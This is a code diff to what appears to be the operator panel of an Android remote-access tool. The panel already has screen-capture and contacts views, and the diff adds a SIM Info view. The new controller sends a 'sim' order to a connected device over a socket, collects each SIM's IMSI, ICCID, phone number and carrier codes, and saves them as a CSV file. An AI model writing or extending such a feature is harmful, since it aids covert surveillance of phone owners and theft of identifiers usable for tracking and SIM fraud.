@@ -49,6 +49,10 @@ app.config(function ($routeProvider) {
         .when("/screenCapture", {
             templateUrl: "./views/screenCapture.html",
             controller: "ScreenCtrl"
+        })
+        .when("/simInfo", {
+            templateUrl: "./views/simInfo.html",
+            controller: "SimCtrl"
         });
 });
 
@@ -488,6 +492,91 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
 
 
 });
+
+
+
+//-----------------------SIM Info Controller (simInfo.htm)------------------------
+// SIM Info controller
+app.controller("SimCtrl", function ($scope, $rootScope) {
+    $SimCtrl = $scope;
+    $SimCtrl.simList = [];
+    var sim = CONSTANTS.orders.sim;
+
+    $SimCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(sim);
+    });
+
+    $SimCtrl.load = 'loading';
+    $rootScope.Log('Get SIM info..');
+    socket.emit(ORDER, { order: sim });
+
+    $SimCtrl.barLimit = 50;
+    $SimCtrl.increaseLimit = () => {
+        $SimCtrl.barLimit += 50;
+    }
+
+    $SimCtrl.SaveSIM = () => {
+
+        if ($SimCtrl.simList.length == 0)
+            return;
+
+        var csvRows = [];
+        csvRows.push("Slot Index,State,Operator Name,Display Name,MCC,MNC,Country ISO,IMSI,ICCID,Phone Number");
+        for (var i = 0; i < $SimCtrl.simList.length; i++) {
+            var sim = $SimCtrl.simList[i];
+            csvRows.push(
+                (sim.slotIndex || "N/A") + "," +
+                (sim.simState || "N/A") + "," +
+                (sim.operatorName || "N/A") + "," +
+                (sim.displayName || "N/A") + "," +
+                (sim.mcc || "N/A") + "," +
+                (sim.mnc || "N/A") + "," +
+                (sim.countryIso || "N/A") + "," +
+                (sim.imsi || "N/A") + "," +
+                (sim.iccid || "N/A") + "," +
+                (sim.phoneNumber || "N/A")
+            );
+        }
+
+        var csvStr = csvRows.join("\n");
+        var csvPath = path.join(downloadsPath, "SIM_Info_" + Date.now() + ".csv");
+        $rootScope.Log("Saving SIM Info...");
+        fs.outputFile(csvPath, csvStr, (error) => {
+            if (error)
+                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log("SIM Info Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+
+        });
+
+    }
+
+    socket.on(sim, (data) => {
+        if (data.simList) {
+            $SimCtrl.load = '';
+            $rootScope.Log('SIM info arrived', CONSTANTS.logStatus.SUCCESS);
+            $SimCtrl.simList = data.simList;
+            $SimCtrl.simCount = data.simCount || data.simList.length;
+            $SimCtrl.hasTelephony = data.hasTelephony !== false;
+            $SimCtrl.$apply();
+        } else if (data.hasTelephony === false) {
+            $SimCtrl.load = '';
+            $rootScope.Log('Device has no telephony capability', CONSTANTS.logStatus.WARNING);
+            $SimCtrl.hasTelephony = false;
+            $SimCtrl.$apply();
+        }
+    });
+
+
+
+
+
+});
+
+
+
+
 
 
 
